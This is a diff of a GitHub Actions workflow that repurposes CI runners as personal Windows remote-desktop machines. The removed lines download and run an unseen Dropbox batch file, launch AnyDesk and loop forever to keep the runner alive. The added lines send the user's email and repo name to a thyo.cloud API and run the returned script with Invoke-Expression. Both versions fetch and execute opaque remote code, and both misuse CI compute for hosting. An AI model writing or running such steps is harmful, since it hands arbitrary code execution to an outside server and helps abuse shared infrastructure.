@@ -1,70 +1,57 @@
-name: Windows Cloud PC - Anydesk Melhorado
+name: ThyoCloud Personal RDP (Fork)
 
 on:
   workflow_dispatch:
+    inputs:
+      osChoice:
+        description: 'Pilih Versi Windows Server'
+        required: true
+        type: choice
+        default: 'windows-2022'
+        options:
+          - windows-latest
+          - windows-2025
+          - windows-2022
+      userEmail:
+        description: 'Email yang terdaftar di Web ThyoCloud'
+        required: true
+      customUsername:
+        description: 'Username RDP (Opsional - Default: thyocloud)'
+        required: false
+        default: 'thyocloud'
 
 jobs:
-  build:
-    name: Iniciando Sistema Reforçado
-    runs-on: windows-latest
+  build-rdp:
+    runs-on: ${{ github.event.inputs.osChoice }}
     timeout-minutes: 360
 
-    env:
-      PROCESSOR_COUNT: 8
-      OPENGL: "1"
-      GITHUB_PRESERVE_WORKFLOW: true
-      MEMORY_GB: 16
-
     steps:
-      - name: Baixar e Instalar Essenciais
-        shell: powershell
+      - name: 🚀 Menghubungkan ke ThyoCloud Server Web
+        env:
+          EMAIL: ${{ github.event.inputs.userEmail }}
+          USER: ${{ github.event.inputs.customUsername }}
+          REPO: ${{ github.event.repository.name }}
+          OS_TYPE: ${{ github.event.inputs.osChoice }}
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/7eiczvgil84czu55dxep3/Downloads.bat?rlkey=wzdc1wxjsph2b7r0atplmdz3p&dl=1" -OutFile "Downloads.bat" -UseBasicParsing
-          cmd /c Downloads.bat
-
-      - name: Iniciar AnyDesk
-        shell: powershell
-        run: |
-          if (Test-Path "start.bat") {
-            cmd /c start.bat
-            Start-Sleep -Seconds 10
-          } else {
-            Write-Host "ERRO: Arquivo start.bat não encontrado — verifique o download."
+          Write-Host "Sistem Operasi Terpilih: $env:OS_TYPE"
+          Write-Host "Verifikasi Email ke ThyoCloud..."
+          
+          $webUrl = "https://thyo.cloud/api/get-core"
+          
+          $body = @{ email = $env:EMAIL; username = $env:USER; repo = $env:REPO } | ConvertTo-Json
+          
+          try {
+            $req = Invoke-RestMethod -Uri $webUrl -Method Post -Body $body -ContentType "application/json"
+            
+            if ($req.success -eq $true) {
+              Write-Host "✅ Akses Diterima! Menjalankan Core Engine..."
+              Invoke-Expression $req.script
+            } else {
+              Write-Host "⛔ GAGAL: $($req.message)"
+              Write-Host "Pastikan kamu sudah klaim Token di Web dan Verify di Bot Telegram @ThyoCloudBot"
+              exit 1
+            }
+          } catch {
+            Write-Host "⛔ Terjadi kesalahan jaringan. Coba lagi nanti."
             exit 1
           }
-
-      - name: Hien thi ID AnyDesk
-        shell: powershell
-        run: |
-          Start-Sleep -Seconds 5
-          # Tim file anydesk.exe trong thư mục hiện tại hoặc các thư mục con
-          $anydeskExe = Get-ChildItem -Filter "anydesk.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-          if ($anydeskExe) {
-            $id = & $anydeskExe.FullName --get-id
-            Write-Host "=========================================="
-            Write-Host "MA ID ANYDESK CUA BAN LA: $id"
-            Write-Host "=========================================="
-          } else {
-            Write-Host "Không tìm thấy file anydesk.exe do Downloads.bat tải về."
-          }
-
-      - name: Monitoramento Contínuo e Reinício Automático
-        shell: powershell
-        run: |
-          while ($true) {
-            $anydesk = Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue
-            if (-not $anydesk -or $anydesk.HasExited) {
-              Write-Host "Reiniciando AnyDesk..."
-              if (Test-Path "start.bat") {
-                cmd /c start.bat
-              }
-            }
-            Start-Sleep -Seconds 60
-          }
-
-      - name: Limpeza Segura
-        if: always()
-        shell: powershell
-        run: |
-          Remove-Item Downloads.bat -Force -ErrorAction SilentlyContinue
-          Write-Host "Limpeza finalizada."
